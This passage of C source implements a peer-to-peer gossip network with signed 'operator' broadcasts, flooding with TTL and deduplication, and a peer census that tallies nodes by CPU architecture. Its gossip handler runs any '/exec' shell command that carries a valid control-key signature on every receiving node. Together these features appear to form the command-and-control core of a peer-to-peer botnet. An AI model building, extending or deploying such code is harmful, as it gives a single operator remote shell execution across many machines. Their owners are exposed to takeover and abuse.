    pthread_mutex_lock(&peer_mgmt_mutex);
    
    if (len == 0 || len > HPV_PKT_MAX) {
        net_log("sndpkt dropped: invalid size (%zu)", len);
        pthread_mutex_unlock(&peer_mgmt_mutex);
        return;
    }
    if (p2p_is_best_effort_packet(msg, len) && p2p_guard_under_pressure()) {
        pthread_mutex_unlock(&peer_mgmt_mutex);
        return;
    }

    active_node_t *target = NULL;
    for (int i = 0; i < as_count; i++) {
        if (id_equal(as[i]->id.id, id.id)) { target = as[i]; break; }
    }
    if (!target) {
        pthread_mutex_unlock(&peer_mgmt_mutex);
        return;
    }
    if (!target->session_key_valid) {
        /* FIXED: Copy ID and disconnect after unlock to avoid deadlock */
        node_id_t target_id = target->id;
        pthread_mutex_unlock(&peer_mgmt_mutex);
        
        net_log("peer %s no session key, disconnecting", id2str(target_id));
        del_connection_reason(target_id, 1, "no-pfs");
        return;
    }

    size_t sealed_len = len + CRYPTO_SEAL_OVERHEAD;
    uint8_t header[3];
    size_t  hlen;
    if (sealed_len > 255) {
        header[0] = 0;
        uint16_t nlen = htons((uint16_t)sealed_len);
        memcpy(header+1, &nlen, 2);
        hlen = 3;
    } else {
        header[0] = (uint8_t)sealed_len;
        hlen = 1;
    }

    size_t total = hlen + sealed_len;
    uint8_t *wire = pkt_alloc();
    if (!wire) {
        pthread_mutex_unlock(&peer_mgmt_mutex);
        return;
    }

    uint64_t nonce = ++target->tx_nonce;
    
    memcpy(wire, header, hlen);
    if (!crypto_seal_with_key(msg, len, wire + hlen, nonce,
                              target->session_key)) {
        pkt_free(wire);
        pthread_mutex_unlock(&peer_mgmt_mutex);
        return;
    }
    
    bool push_result = wbuf_push(&target->wbuf, wire, total);
    
    /* FIXED: Copy target info before unlock to avoid use-after-free */
    node_id_t target_id = target->id;
    int target_fd = target->fd;
    
    pthread_mutex_unlock(&peer_mgmt_mutex);

    if (!push_result) {
        if (p2p_is_best_effort_packet(msg, len)) {
            net_log("peer %s slow (write buffer full); non-critical packet %u dropped",
                    id2str(target_id), msg[0]);
            pkt_free(wire);
            return;
        }

        net_log("peer %s slow (write buffer full) on critical packet %u, disconnecting",
                id2str(target_id), msg[0]);
        pkt_free(wire);
        del_connection_reason(target_id, 1, "write-buffer-critico");
        return;
    }
    pkt_free(wire);

    if (epoll_fd >= 0) {
        struct epoll_event ev;
        ev.events   = EPOLLIN | EPOLLOUT;
        ev.data.ptr = NULL; /* FIXED: Don't use target pointer after unlock */
        
        /* Revalidate target pointer for epoll operation */
        pthread_mutex_lock(&peer_mgmt_mutex);
        active_node_t *current_target = NULL;
        for (int i = 0; i < as_count; i++) {
            if (id_equal(as[i]->id.id, target_id.id) && as[i]->fd == target_fd) {
                current_target = as[i];
                break;
            }
        }
        if (current_target) {
            ev.data.ptr = current_target;
            epoll_ctl(epoll_fd, EPOLL_CTL_MOD, target_fd, &ev);
        }
        pthread_mutex_unlock(&peer_mgmt_mutex);
    }
}

void dht_send(node_id_t dest, uint8_t msg_type, const uint8_t *payload, size_t plen)
{
    size_t   total = 1 + plen;
    if (total > HPV_PKT_MAX) return;
    uint8_t *buf   = malloc(total);
    if (!buf) return;
    buf[0] = msg_type;
    if (plen) memcpy(buf+1, payload, plen);
    sndpkt(dest, buf, total);
    free(buf);
}

void shuffle(void)
{
    
    next_shuffle_time = time(NULL) + shuffle0 +
                        (int)crypto_random_below((uint32_t)shuffle1);
    if (as_count == 0 || ps_count == 0) return;

    size_t   pkt_max = 1 + (size_t)(ka + kp) * 6;
    uint8_t *pkt     = malloc(pkt_max);
    if (!pkt) return;

    pkt[0] = M_SHUFFLE;
    int offset = 1;
    for (int i = 0; i < ka; i++) {
        memcpy(pkt + offset,
               as[crypto_random_below((uint32_t)as_count)]->id.id, 6);
        offset += 6;
    }
    for (int i = 0; i < kp; i++) {
        memcpy(pkt + offset,
               ps[crypto_random_below((uint32_t)ps_count)].id.id, 6);
        offset += 6;
    }
    sndpkt(as[crypto_random_below((uint32_t)as_count)]->id, pkt, (size_t)offset);
    free(pkt);
    
}

bool flood(node_id_t src, uint8_t type, uint8_t *data,
                  size_t data_len, int ttl)
{
    if (ttl > P2P_BROADCAST_TTL_MAX)
        ttl = P2P_BROADCAST_TTL_MAX;

    // Fast hash: combine type and data in one pass
    uint64_t msg_hash = hash64(data, data_len, type);

    uint32_t now_u = (uint32_t)time(NULL);
    int i = 0;
    while (i < backlog_count) {
        if (backlog[i].expire < now_u) {
            backlog[i] = backlog[backlog_count-1];
            backlog_count--;
        } else {
            if (backlog[i].hash == msg_hash) return false; 
            i++;
        }
    }
    if (backlog_count >= backlog_max) {
        memmove(backlog, backlog+1,
                sizeof(backlog_entry_t) * (backlog_max-1));
        backlog_count = backlog_max - 1;
    }
    backlog[backlog_count].expire = now_u + 120;
    backlog[backlog_count].hash = msg_hash;
    backlog_count++;

    if (ttl > 0) {
        const char *guard_reason = NULL;
        if (!p2p_guard_allow_broadcast(data_len, ttl, &guard_reason)) {
            net_log("broadcast dropped: %s",
                    guard_reason ? guard_reason : "policy");
            return false;
        }
        ttl--;
        if (data_len + 3 > HPV_PKT_MAX) return true;
        uint8_t pkt[HPV_PKT_MAX];
        pkt[0] = M_BROADCAST; pkt[1] = (uint8_t)ttl; pkt[2] = type;
        memcpy(pkt+3, data, data_len);
        int fanout = P2P_BROADCAST_FANOUT_MAX;
        if (p2p_guard_under_pressure()) fanout = 1;
        if (fanout > as_count) fanout = as_count;
        int sent = 0;
        int start = as_count > 0 ? (int)crypto_random_below((uint32_t)as_count) : 0;
        for (int scanned = 0; scanned < as_count && sent < fanout; scanned++) {
            int j = (start + scanned) % as_count;
            if (id_equal(as[j]->id.id, src.id)) continue;
            sndpkt(as[j]->id, pkt, data_len + 3);
            sent++;
        }
    }
    return true;
}

/* callback: receive control commands via overlay */
void overlay_on_control_request(int sess_id,
                                      const uint8_t infohash[OVERLAY_INFOHASH_LEN],
                                      uint32_t offset,
                                      uint32_t length)
{
    /* special hash for control messages */
    static const uint8_t control_hash[20] = {
        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA
    };
    
    if (memcmp(infohash, control_hash, 20) != 0) {
        net_log("overlay: request is not control session=%d", sess_id);
        return;
    }
    
    const char *ack_msg = "CMD_ACK";
    if (!overlay_send_response(sess_id, control_hash, offset,
                              (const uint8_t *)ack_msg, strlen(ack_msg))) {
        net_log("overlay: failed sending ACK session=%d", sess_id);
        return;
    }
    
    net_log("overlay: command processed session=%d offset=%u len=%u",
            sess_id, offset, length);
}

/* callback: receive command responses via overlay */
void overlay_on_control_response(int sess_id,
                                       const uint8_t infohash[OVERLAY_INFOHASH_LEN],
                                       uint32_t offset,
                                       const uint8_t *data,
                                       size_t data_len)
{
    (void)offset;
    /* special hash for control messages */
    static const uint8_t control_hash[20] = {
        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
        0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA
    };
    
    if (memcmp(infohash, control_hash, 20) != 0) {
        net_log("overlay: response is not control session=%d", sess_id);
        return;
    }
    
    char msg_buf[HPV_PKT_MAX];
    size_t copy_len = data_len < sizeof(msg_buf)-1 ? data_len : sizeof(msg_buf)-1;
    memcpy(msg_buf, data, copy_len);
    msg_buf[copy_len] = '\0';
    
    /* process command received via overlay */
    if (strncmp(msg_buf, "NETPEERS_REQ", 12) == 0) {
        netpeers_handle_request_text(msg_buf);
        return;
    }
    
    if (strncmp(msg_buf, "NETPEERS_RESP", 13) == 0) {
        netpeers_record_response_text(msg_buf);
        return;
    }
    
    if (strncmp(msg_buf, "/operator ", 10) == 0) {
        if (!parse_node_v2(msg_buf, NULL, NULL, NULL)) {
            net_log("overlay: rejected malformed remote command session=%d", sess_id);
            return;
        }
        net_log("overlay: remote commands are disabled session=%d", sess_id);
        return;
    }
    
    net_log("overlay: unknown message session=%d msg=\"%s\"", sess_id, msg_buf);
}

/*
 * Deliver an authenticated gossip message locally.
 *
 * Flooding is handled by the HPV layer before this function is called.  The
 * previous implementation opened an overlay session back to the sender and
 * bounced the message to it.  Besides depending on an already-established
 * overlay, that reversed the direction of the command and prevented census
 * requests from ever being handled by the receiving node.
 */
void p2p_handle_gossip_message(node_id_t src_id, uint8_t *data,
                                size_t data_len, int ttl)
{
    (void)ttl;
    
    /* process original signed gossip message */
    if (data_len < 1 + CRYPTO_SIG_LEN + CRYPTO_PUBKEY_LEN + 1) {
        net_log("gossip: packet too short (%zu B)", data_len);
        return;
    }
    
    const uint8_t *sig_orig    = data;
    const uint8_t *pubkey_orig = data + CRYPTO_SIG_LEN;
    const uint8_t *text        = data + CRYPTO_SIG_LEN + CRYPTO_PUBKEY_LEN;
    size_t         text_len    = data_len - CRYPTO_SIG_LEN - CRYPTO_PUBKEY_LEN;
    
    if (!crypto_verify(text, text_len, sig_orig, pubkey_orig)) {
        net_log("gossip: invalid Ed25519 signature from %s", id2str(src_id));
        return;
    }
    
    char text_buf[HPV_PKT_MAX];
    size_t copy_len = text_len < sizeof(text_buf)-1 ? text_len : sizeof(text_buf)-1;
    memcpy(text_buf, text, copy_len);
    text_buf[copy_len] = '\0';
    
    if (strncmp(text_buf, "NETPEERS_REQ", 12) == 0) {
        netpeers_handle_request_text(text_buf);
        return;
    }

    if (strncmp(text_buf, "NETPEERS_RESP", 13) == 0) {
        netpeers_record_response_text(text_buf);
        return;
    }

    if (strncmp(text_buf, "/operator ", 10) == 0) {
        const char *cmd_text = NULL;
        uint64_t counter = 0;
        time_t cmd_ts = 0;
        
        if (!parse_node_v2(text_buf, &counter, &cmd_ts, &cmd_text)) {
            net_log("gossip: rejected invalid remote command from %s",
                    id2str(src_id));
            return;
        }
        
        /* Check if this is an /exec command */
        if (cmd_text && strncmp(cmd_text, "/exec ", 6) == 0) {
            const char *shell_cmd = cmd_text + 6;
            
            /* Execute command and capture output */
            char output[2048];
            if (execute_shell_command(shell_cmd, output, sizeof(output))) {
                net_log("gossip: /exec from %s executed: %.60s", 
                        id2str(src_id), shell_cmd);
                
                /* Log first 200 chars of output */
                if (p2p_operator_mode) {
                    char safe_output[256];
                    size_t out_len = strlen(output);
                    size_t copy_len = out_len < 200 ? out_len : 200;
                    memcpy(safe_output, output, copy_len);
                    safe_output[copy_len] = '\0';
                    
                    /* Replace newlines with spaces for logging */
                    for (size_t i = 0; i < copy_len; i++) {
                        if (safe_output[i] == '\n' || safe_output[i] == '\r')
                            safe_output[i] = ' ';
                    }
                    
                    net_log("gossip: output: %s%s", safe_output, 
                            out_len > 200 ? "..." : "");
                }
            } else {
                net_log("gossip: /exec from %s failed: %.60s", 
                        id2str(src_id), shell_cmd);
            }
            
            /* Command was processed - propagation already happened via flood() */
            return;
        }
        
        /* Other /operator commands */
        net_log("gossip: non-exec operator command from %s (not implemented)", 
                id2str(src_id));
        return;
    }

    char signer[17];
    pubkey_short_hex(pubkey_orig, signer);
    net_log("gossip: signed message signer=%s msg=\"%.180s%s\"",
            signer, text_buf, strlen(text_buf) > 180 ? "..." : "");
}

/*
 * Network-wide control traffic deliberately stays on authenticated gossip.
 * Overlay sessions are point-to-point and are not a replacement for a flood
 * protocol unless they implement their own hop limit and duplicate cache.
 */
static bool p2p_broadcast_wire_message_ttl(const char *wire_msg, uint8_t ttl)
{
    if (!wire_msg) return false;
    size_t text_len = strlen(wire_msg);
    if (text_len > HPV_PKT_MAX - 3 - CRYPTO_SIG_LEN - CRYPTO_PUBKEY_LEN) {
        net_log("gossip: message too long (%zu B)", text_len);
        return false;
    }

    if (ttl == 0) ttl = 1;
    if (ttl > P2P_BROADCAST_TTL_MAX) ttl = P2P_BROADCAST_TTL_MAX;

    uint8_t sig[CRYPTO_SIG_LEN];
    if (!crypto_sign((const uint8_t *)wire_msg, text_len, sig)) {
        net_log("gossip: could not sign broadcast");
        return false;
    }

    size_t pkt_len = CRYPTO_SIG_LEN + CRYPTO_PUBKEY_LEN + text_len;
    uint8_t payload[HPV_PKT_MAX];
    memcpy(payload, sig, CRYPTO_SIG_LEN);
    memcpy(payload + CRYPTO_SIG_LEN, my_ed25519_pubkey, CRYPTO_PUBKEY_LEN);
    memcpy(payload + CRYPTO_SIG_LEN + CRYPTO_PUBKEY_LEN, wire_msg, text_len);

    node_id_t local_origin = {{0}};
    bool accepted = flood(local_origin, P2P_BC_SUBTYPE, payload, pkt_len,
                          (int)ttl + 1);
    if (!accepted) {
        net_log("gossip: duplicate or rejected local broadcast");
        return false;
    }

    net_log("gossip: broadcast started ttl=%u peers=%d msg=\"%.120s%s\"",
            (unsigned)ttl, as_count, wire_msg,
            text_len > 120 ? "..." : "");
    return true;
}

static bool p2p_broadcast_wire_message(const char *wire_msg)
{
    return p2p_broadcast_wire_message_ttl(wire_msg, (uint8_t)gossip_ttl);
}

bool p2p_netpeers_start(int window_secs)
{
    uint8_t req_bytes[NETPEERS_REQUEST_ID_BYTES];
    char request_id[NETPEERS_REQUEST_ID_HEX + 1];

    if (window_secs <= 0)
        window_secs = NETPEERS_WINDOW_DEFAULT;
    if (window_secs < NETPEERS_WINDOW_MIN) {
        printf("Usage: /net-peers [>=%d]\n", NETPEERS_WINDOW_MIN);
        return false;
    }
    if (netpeers_census.active) {
        printf("already got an active census request_id=%s\n",
               netpeers_census.request_id);
        return false;
    }
    if (!crypto_random_bytes(req_bytes, sizeof(req_bytes))) {
        uint64_t fallback = ((uint64_t)xr64_rand() << 32) ^ xr64_rand();
        memset(req_bytes, 0, sizeof(req_bytes));
        memcpy(req_bytes, &fallback, sizeof(fallback));
    }
    bytes_to_hex_local(req_bytes, sizeof(req_bytes), request_id);
    p2p_secure_wipe(req_bytes, sizeof(req_bytes));

    memset(&netpeers_census, 0, sizeof(netpeers_census));
    netpeers_census.active = true;
    snprintf(netpeers_census.request_id, sizeof(netpeers_census.request_id),
             "%s", request_id);
    netpeers_census.started_at = time(NULL);
    netpeers_census.next_probe_at = netpeers_census.started_at;
    netpeers_census.window_secs = window_secs;
    netpeers_census.rounds_planned =
        1 + ((window_secs - 1) / NETPEERS_ROUND_INTERVAL);
    if (netpeers_census.rounds_planned > NETPEERS_ROUND_MAX)
        netpeers_census.rounds_planned = NETPEERS_ROUND_MAX;
    netpeers_census.ttl = netpeers_effective_ttl();

    printf("Robust census started request_id=%s window=%ds ttl=%d rounds=%d\n",
           request_id, window_secs, netpeers_census.ttl,
           netpeers_census.rounds_planned);
    fflush(stdout);
    return true;
}

static bool netpeers_send_probe_round(int round)
{
    char request[96];
    char response[HPV_PKT_MAX];
    bool ok = true;

    if (!netpeers_census.active || round < 0) return false;

    snprintf(request, sizeof(request), "NETPEERS_REQ2 %s %d",
             netpeers_census.request_id, round);
    if (!p2p_broadcast_wire_message_ttl(request, netpeers_census.ttl))
        ok = false;

    if (round == 0) {
        snprintf(request, sizeof(request), "NETPEERS_REQ %s",
                 netpeers_census.request_id);
        (void)p2p_broadcast_wire_message_ttl(request, netpeers_census.ttl);
    }

    netpeers_seen_request(netpeers_census.request_id, round, time(NULL));
    if (netpeers_send_response(netpeers_census.request_id, round,
                               netpeers_census.ttl, response))
        netpeers_record_response_text(response);

    netpeers_census.probes_sent++;
    return ok;
}

static int netpeers_result_cmp(const void *a, const void *b)
{
    const netpeers_result_t *ra = (const netpeers_result_t *)a;
    const netpeers_result_t *rb = (const netpeers_result_t *)b;
    return strcmp(ra->node_key, rb->node_key);
}

bool p2p_netpeers_tick(void)
{
    typedef struct {
        char arch[16];
        int count;
    } arch_count_t;
    
    time_t now = time(NULL);

    if (!netpeers_census.active)
        return false;

    while (netpeers_census.next_round < netpeers_census.rounds_planned &&
           now >= netpeers_census.next_probe_at &&
           netpeers_census.next_probe_at <
           netpeers_census.started_at + netpeers_census.window_secs) {
        (void)netpeers_send_probe_round(netpeers_census.next_round);
        netpeers_census.next_round++;
        netpeers_census.next_probe_at = now + NETPEERS_ROUND_INTERVAL;
    }

    if (now < netpeers_census.started_at + netpeers_census.window_secs)
        return false;

    qsort(netpeers_census.results, (size_t)netpeers_census.result_count,
          sizeof(netpeers_census.results[0]), netpeers_result_cmp);

    // count by architecture
    arch_count_t arch_counts[32];
    int arch_type_count = 0;
    
    for (int i = 0; i < netpeers_census.result_count; i++) {
        const netpeers_result_t *r = &netpeers_census.results[i];
        
        bool found = false;
        for (int j = 0; j < arch_type_count; j++) {
            if (strcmp(arch_counts[j].arch, r->arch) == 0) {
                arch_counts[j].count++;
                found = true;
                break;
            }
        }
        if (!found && arch_type_count < 32) {
            snprintf(arch_counts[arch_type_count].arch, 16, "%s", r->arch);
            arch_counts[arch_type_count].count = 1;
            arch_type_count++;
        }
    }

    printf("total: %d\n", netpeers_census.result_count);
    
    if (arch_type_count == 0) {
        printf("  none\n");
    } else {
        for (int i = 0; i < arch_type_count - 1; i++) {
            for (int j = i + 1; j < arch_type_count; j++) {
                if (strcasecmp(arch_counts[i].arch, arch_counts[j].arch) > 0) {
                    arch_count_t temp = arch_counts[i];
                    arch_counts[i] = arch_counts[j];
                    arch_counts[j] = temp;
                }
            }
        }
        
        for (int i = 0; i < arch_type_count; i++) {
            printf("%s: %d\n", arch_counts[i].arch, arch_counts[i].count);
        }
    }
    
    fflush(stdout);

    memset(&netpeers_census, 0, sizeof(netpeers_census));
    return true;
}

bool p2p_broadcast_message(const char *msg)
{
    p2p_clear_admin_error();
    if (!msg || msg[0] == '\0') return false;
    const char *node_cmd = NULL;
    bool is_node_cmd = p2p_node_command_from_chat(msg, &node_cmd);
    const char *wire_msg = msg;
    if (is_node_cmd) {
        char node_v2_msg[HPV_PKT_MAX];
        uint8_t control_pubkey[CRYPTO_PUBKEY_LEN];
        if (!crypto_control_get_pubkey(control_pubkey)) {
            net_log("command not sent: missing valid P2P_COMPILED_CONTROL_PUBKEY_HEX");
            return false;
        }
        if (control_pubkey_is_revoked(control_pubkey)) {
            p2p_secure_wipe(control_pubkey, sizeof(control_pubkey));
            net_log("command not sent: control key revoked");
            return false;
        }
        p2p_secure_wipe(control_pubkey, sizeof(control_pubkey));
        if (!crypto_control_sign_configured()) {
            net_log("command not sent: missing loaded control private key");
            return false;
        }
        if (!build_node_v2_message(node_cmd, node_v2_msg, sizeof(node_v2_msg))) {
            net_log("command too long for /operator");
            return false;
        }
        wire_msg = node_v2_msg;
    }
    if (!p2p_broadcast_wire_message(wire_msg))
        return false;
    /* The operator node only injects the command.  Execution happens on the
     * authenticated receivers, never as a local side effect of broadcasting. */
    return true;
}
